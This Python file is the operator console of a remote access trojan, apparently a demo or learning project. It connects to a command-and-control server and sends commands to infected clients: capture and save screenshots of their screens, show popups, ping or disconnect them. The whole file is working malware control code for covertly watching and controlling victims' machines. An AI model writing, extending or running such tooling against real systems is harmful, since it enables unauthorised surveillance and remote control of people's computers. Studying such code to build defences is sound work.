"""
RAT Operator CLI
Command line interface for controlling RAT clients through C2 server
"""

import socket
import threading
import time
import sys
import os
import argparse

# Import protocol from server directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
from protocol import Protocol, Commands, ResponseTypes

class OperatorCLI:
    """Operator command line interface"""
    
    def __init__(self, server_host='172.20.10.2', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.clients = {}  # client_id -> last_seen
        
    def connect(self) -> bool:
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            print(f"[+] Connected to C2 server {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def start(self):
        """Start the operator interface"""
        if not self.connect():
            return
            
        self.running = True
        
        # Start response listener thread
        listener_thread = threading.Thread(target=self.response_listener, daemon=True)
        listener_thread.start()
        
        # Start CLI loop
        self.cli_loop()
    
    def response_listener(self):
        """Listen for responses from C2 server"""
        buffer = ""
        
        while self.running:
            try:
                data = self.socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        self.handle_response(line.strip())
                        
            except socket.error:
                break
            except Exception as e:
                print(f"[-] Response listener error: {e}")
                break
    
    def handle_response(self, response_data: str):
        """Handle response from server"""
        try:
            parsed = Protocol.parse_message(response_data)
            if not parsed:
                return
                
            response_type = parsed.get('type')
            
            if response_type == ResponseTypes.SCREENSHOT:
                self.handle_screenshot_response(parsed)
            elif response_type == ResponseTypes.POPUP:
                self.handle_popup_response(parsed)
            elif response_type == ResponseTypes.ERROR:
                print(f"[-] Client error: {parsed.get('payload')}")
                
        except Exception as e:
            print(f"[-] Response handling error: {e}")
    
    def handle_screenshot_response(self, parsed):
        """Handle screenshot response"""
        try:
            payload = parsed.get('payload')
            if payload:
                timestamp = int(time.time())
                filename = f"screenshot_{timestamp}.png"
                Protocol.decode_image(payload, filename)
                print(f"[+] Screenshot saved as {filename}")
            else:
                print("[-] Empty screenshot received")
        except Exception as e:
            print(f"[-] Screenshot handling error: {e}")
    
    def handle_popup_response(self, parsed):
        """Handle popup response"""
        payload = parsed.get('payload', {})
        button = payload.get('button_pressed', 'unknown')
        print(f"[+] Popup response - Button pressed: {button}")
    
    def cli_loop(self):
        """Main CLI loop"""
        print("\n" + "="*50)
        print("RAT Operator Console")
        print("="*50)
        
        while self.running:
            try:
                self.show_menu()
                choice = input("\nEnter choice: ").strip()
                
                if choice == '1':
                    self.list_clients()
                elif choice == '2':
                    self.send_screenshot_command()
                elif choice == '3':
                    self.send_popup_command()
                elif choice == '4':
                    self.send_ping_command()
                elif choice == '5':
                    self.disconnect_client()
                elif choice == '0':
                    self.running = False
                    break
                else:
                    print("Invalid choice!")
                    
            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] CLI error: {e}")
        
        self.cleanup()
    
    def show_menu(self):
        """Display main menu"""
        print("\n" + "-"*30)
        print("1. List active clients")
        print("2. Take screenshot")
        print("3. Show popup")
        print("4. Send ping")
        print("5. Disconnect client")
        print("0. Exit")
        print("-"*30)
    
    def list_clients(self):
        """List active clients (simulated - in real implementation would query server)"""
        print("\n[*] Active Clients:")
        print("Note: This is a demo - client list would be provided by C2 server")
        print("Example clients:")
        print("1. 192.168.1.100:12345")
        print("2. 192.168.1.101:12346")
        print("\nFor demo purposes, commands will be sent to all connected clients.")
    
    def send_screenshot_command(self):
        """Send screenshot command"""
        try:
            print("[*] Sending screenshot command...")
            command = Protocol.create_command(Commands.SCREENSHOT)
            self.socket.send(command.encode('utf-8'))
            print("[+] Screenshot command sent")
        except Exception as e:
            print(f"[-] Error sending screenshot command: {e}")
    
    def send_popup_command(self):
        """Send popup command"""
        try:
            title = input("Enter popup title (default: 'RAT Demo'): ").strip()
            if not title:
                title = "RAT Demo"
                
            message = input("Enter popup message (default: 'Hello from RAT!'): ").strip()
            if not message:
                message = "Hello from RAT!"
                
            popup_type = input("Enter popup type (info/warning/error) [default: info]: ").strip()
            if popup_type not in ['info', 'warning', 'error']:
                popup_type = 'info'
            
            print(f"[*] Sending popup command: {title} - {message}")
            command = Protocol.create_command(Commands.POPUP, 
                                            title=title, 
                                            message=message, 
                                            type=popup_type)
            self.socket.send(command.encode('utf-8'))
            print("[+] Popup command sent")
            
        except Exception as e:
            print(f"[-] Error sending popup command: {e}")
    
    def send_ping_command(self):
        """Send ping command"""
        try:
            print("[*] Sending ping command...")
            command = Protocol.create_command(Commands.PING)
            self.socket.send(command.encode('utf-8'))
            print("[+] Ping command sent")
        except Exception as e:
            print(f"[-] Error sending ping command: {e}")
    
    def disconnect_client(self):
        """Send disconnect command"""
        try:
            confirm = input("Are you sure you want to disconnect all clients? (y/N): ").strip().lower()
            if confirm == 'y':
                print("[*] Sending disconnect command...")
                command = Protocol.create_command(Commands.QUIT)
                self.socket.send(command.encode('utf-8'))
                print("[+] Disconnect command sent")
        except Exception as e:
            print(f"[-] Error sending disconnect command: {e}")
    
    def cleanup(self):
        """Clean up operator connection"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[*] Operator disconnected")

def main():
    parser = argparse.ArgumentParser(description='RAT Operator CLI')
    parser.add_argument('--host', default='172.20.10.2', help='C2 server host')
    parser.add_argument('--port', type=int, default=4444, help='C2 server port')
    
    args = parser.parse_args()
    
    operator = OperatorCLI(args.host, args.port)
    
    try:
        operator.start()
    except KeyboardInterrupt:
        print("\n[*] Operator shutting down...")
        operator.cleanup()

if __name__ == "__main__":
    main() 